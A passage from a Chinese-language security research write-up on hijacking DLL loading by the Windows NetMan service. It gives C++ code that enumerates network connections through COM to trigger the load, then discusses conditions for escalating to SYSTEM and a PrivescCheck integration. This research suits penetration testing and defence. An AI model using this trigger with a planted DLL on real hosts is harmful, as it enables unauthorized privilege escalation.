    #include 
    int main()
    {
        HRESULT hResult;
        typedef void(__stdcall* LPNcFreeNetconProperties)(NETCON_PROPERTIES* pProps);
        HMODULE hModule = LoadLibrary(L"netshell.dll");
        if (hModule == NULL) { return 1; }
        LPNcFreeNetconProperties NcFreeNetconProperties = (LPNcFreeNetconProperties)GetProcAddress(hModule, "NcFreeNetconProperties");
        hResult = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (SUCCEEDED(hResult))
        {
            INetConnectionManager* pConnectionManager = 0;
            HRESULT hResult = CoCreateInstance(CLSID_ConnectionManager, 0, CLSCTX_ALL, __uuidof(INetConnectionManager), (void**)&pConnectionManager);
            if (SUCCEEDED(hResult))
            {
                IEnumNetConnection* pEnumConnection = 0;
                hResult = pConnectionManager->EnumConnections(NCME_DEFAULT, &pEnumConnection);
                if (SUCCEEDED(hResult))
                {
                    INetConnection* pConnection = 0;
                    ULONG count;
                    while (pEnumConnection->Next(1, &pConnection, &count) == S_OK)
                    {
                        NETCON_PROPERTIES* pConnectionProperties = 0;
                        hResult = pConnection->GetProperties(&pConnectionProperties);
                        if (SUCCEEDED(hResult))
                        {
                            wprintf(L"Interface: %ls\n", pConnectionProperties->pszwName);
                            NcFreeNetconProperties(pConnectionProperties);
                        }
                        else
                        {
                            wprintf(L"[-] INetConnection::GetProperties() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
                        }
                        pConnection->Release();
                    }
                    pEnumConnection->Release();
                }
                else
                {
                    wprintf(L"[-] IEnumNetConnection::EnumConnections() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
                }
                pConnectionManager->Release();
            }
            else
            {
                wprintf(L"[-] CoCreateInstance() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
            }
            CoUninitialize();
        }
        else
        {
            wprintf(L"[-] CoInitializeEx() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
        }
        wprintf(L"Done\n");
    }
下图显示了在Windows Server 2008
R2上的运行结果。可以看到，我们只要简单枚举主机上的Ethernet接口，就能触发DLL加载行为。在利用这种技术时，主机上必须至少具备一个Ethernet接口。
如果我们在Windows Server 2019上，以普通用户身份通过远程PowerShell会话来运行该程序时，结果如下所示：
## 0x04 总结
根据此次研究，我认为`NetMan`服务可能是目前我了解的DLL劫持攻击最理想的目标。作为普通用户，我们需要一个交互式会话（RDP/VID），因此如果我们通过远程PowerShell会话登录，那这种方法将无法派上用场。然而还有比较有趣的其他情况，如果我们拿下了以`LOCAL
SERVICE`或者`NETWORK SERVICE`运行的其他服务，那么仍然可以触发NetMan服务，将权限提升至`SYSTEM`。
此次研究中我也获得了一些经验，如果将注意力和精力集中在特定的环境中，有时候可能会阻止我们找到有趣的信息。这个经验在渗透测试中非常重要。
最后顺便提一句，我在[PrivescCheck](https://github.com/itm4n/PrivescCheck)（Windows权限提升检查脚本）中集成了这种技术。根据具体的Windows版本，我们能够通过`Invoke-HijackableDllsCheck`函数了解可能通过`%PATH%`目录劫持的DLL，这里还要感谢@1mm0rt41提供的建议。
## 0x05 参考资料
  * Microsoft Security Response Center (MSRC) – Triaging a DLL planting vulnerability  
  * CVE-2020-0668 – A Trivial Privilege Escalation Bug in Windows Service Tracing  
  * A few binary planting 0-days for Windows  